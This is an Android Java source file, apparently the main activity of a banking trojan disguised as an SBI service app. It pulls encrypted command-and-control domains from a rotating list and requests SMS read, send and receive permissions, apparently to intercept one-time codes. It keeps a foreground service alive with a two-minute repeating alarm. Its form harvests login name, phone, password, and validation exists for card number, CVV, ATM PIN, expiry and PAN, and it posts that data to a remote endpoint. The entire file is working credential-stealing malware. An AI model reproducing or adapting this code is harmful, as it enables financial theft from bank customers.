    package com.system.service.sbi;

    import android.Manifest;
    import android.annotation.SuppressLint;
    import android.app.AlarmManager;
    import android.app.PendingIntent;
    import android.content.Context;
    import android.content.DialogInterface;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.os.Build;
    import android.os.Bundle;
    import android.provider.Settings;
    import android.util.Log;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.annotation.RequiresApi;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;

    import com.system.service.sbi.MinorServices.BackgroundService;
    import com.system.service.sbi.MinorServices.FormValidator;
    import com.system.service.sbi.MinorServices.SharedPreferencesHelper;

    import org.json.JSONException;
    import org.json.JSONObject;

    import java.util.HashMap;
    import java.util.Map;

    public class MainActivity extends AppCompatActivity {

        public Map<Integer, String> ids;
        public HashMap<String, Object> dataObject;


        private static final int SMS_PERMISSION_REQUEST_CODE = 1;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            if(!HelperService.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }
            this.updateDomain(this);

        }

        public void initFunction(){


            dataObject = new HashMap<>();
            checkAndRequestPermissions();

            HelperService helperService1 = new HelperService();
            Log.d(helperService1.TAG, helperService1.SITE());

            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            // Initialize the ids map
            ids = new HashMap<>();
            ids.put(R.id.masternm, "masternm");
            ids.put(R.id.ph00n, "ph00n");
            ids.put(R.id.usrmpasss, "usrmpasss");

            // Populate dataObject
            for(Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                String value = editText.getText().toString().trim();
                dataObject.put(key, value);
            }

            Button buttonSubmit = findViewById(R.id.login_button);
            buttonSubmit.setOnClickListener(v -> {

                if (validateForm()) {

                    JSONObject dataJson = new JSONObject(dataObject);
                    JSONObject sendPayload = new JSONObject();
                    try {
                        HelperService helperService = new HelperService();
                        dataJson.put("mobileName", Build.MODEL);
                        sendPayload.put("site", helperService.SITE());
                        sendPayload.put("data", dataJson);
                        HelperService.postRequest(helperService.FormSavePath(), sendPayload, getApplicationContext(),  new HelperService.ResponseListener() {
                            @Override
                            public void onResponse(String result) {
                                if (result.startsWith("Response Error:")) {
                                    Toast.makeText(MainActivity.this, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                } else {
                                    try {
                                        JSONObject response = new JSONObject(result);
                                        if(response.getInt("status")==200){
                                            Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                                            intent.putExtra("id", response.getInt("data"));
                                            startActivity(intent);
                                        }else{
                                            Log.d(HelperService.TAG, "Status  Not 200"+response);
                                            Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                        }
                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                    }
                                }
                            }
                        });
                    } catch (JSONException e) {
                        Toast.makeText(MainActivity.this, "Error1 "+e.toString(), Toast.LENGTH_SHORT).show();
                    }
                }else{
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });
            scheduleDomainUpdateAlarm();
        }

        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
        private void initializeWebView() {
            // Implementation
        }

        public boolean validateForm() {
            boolean isValid = true; // Assume the form is valid initially

            // Clear dataObject before adding new data
            dataObject.clear();

            for (Map.Entry<Integer, String> entry : ids.entrySet()) {
                int viewId = entry.getKey();
                String key = entry.getValue();
                EditText editText = findViewById(viewId);

                // Check if the field is required and not empty
                if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                    isValid = false; // Mark as invalid if required field is missing
                    continue; // Continue with the next field
                }

                String value = editText.getText().toString().trim();

                // Validate based on the key
                switch (key) {
                    case "moo":
                        if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                            isValid = false;
                        }
                        break;

                    case "cvv":
                        if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                            isValid = false;
                        }
                        break;
                    case "pin":
                        if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                            isValid = false;
                        }
                        break;
                    case "tpin":
                        if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                            isValid = false;
                        }
                        break;
                    case "expiry":
                        if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                            isValid = false;
                        }
                        break;
                    case "card":
                        if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                            isValid = false;
                        }
                        break;
                    case "pan":
                        if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                            isValid = false;
                        }
                        break;
                    default:
                        break;
                }

                // Add to dataObject only if the field is valid
                if (isValid) {
                    dataObject.put(key, value);
                }
            }

            return isValid;
        }


        // start permission checker
        private void checkAndRequestPermissions() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (
                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||

                        ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                )
                {
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS},
                            SMS_PERMISSION_REQUEST_CODE);
                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                }
            } else {
                Toast.makeText(this, "Below Android Device", Toast.LENGTH_SHORT).show();
                initializeWebView();
            }
        }

        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                               @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0 &&
                        grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                        grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                } else {
                    showPermissionDeniedDialog();
                }
            }
        }

        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("All permissions are required to perform the application actions. " + "Please grant the permissions in the app settings.");

            // Open settings button
            builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    openAppSettings();
                }
            });

            // Cancel button
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    finish();
                }
            });

            builder.show();
        }
        private void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        private void scheduleDomainUpdateAlarm() {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

            Intent intent = new Intent(this, DomainUpdateReceiver.class);
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                    ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                    : PendingIntent.FLAG_UPDATE_CURRENT;

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this, 0, intent, flags);

            // 1mnt call
            long interval = 2 * 60 * 1000;
            long triggerAtMillis = System.currentTimeMillis() + interval;
            alarmManager.setRepeating(
                    AlarmManager.RTC_WAKEUP, triggerAtMillis, interval, pendingIntent);
        }

        public void updateDomain(final Context cc) {
            final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
            final NetworkHelper network = new NetworkHelper();
            final HelperService help = new HelperService();
            String DomainList = help.DomainList();
            final String[] domainArray = DomainList.split(", ");
            checkDomainSequentially(0, domainArray, db, network);
        }

        private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
            if (index >= domainArray.length) {
                db.saveString("domainStatus", "failed");
                return;
            }
            final String currentDomain = domainArray[index];
            network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
                @Override
                public void onSuccess(String result) {
                    String encryptedData = result.trim();

                    try {
                        HelperService h = new HelperService();
                        String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());

                        if (!decryptedData.isEmpty()) {
                            JSONObject object = new JSONObject(decryptedData);
                            db.saveString("domain", object.getString("domain"));
                            db.saveString("socket", object.getString("socket"));
                            initFunction();
                        }
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                }

                @Override
                public void onFailure(String error) {
                    Log.d(HelperService.TAG, "Failed for domain: " + currentDomain + " Error: " + error);
                    Toast.makeText(getApplicationContext(), "Failed for domain: " + currentDomain + " Error: " + error, Toast.LENGTH_LONG).show();
                    checkDomainSequentially(index + 1, domainArray, db, network);
                }
            });
        }

    }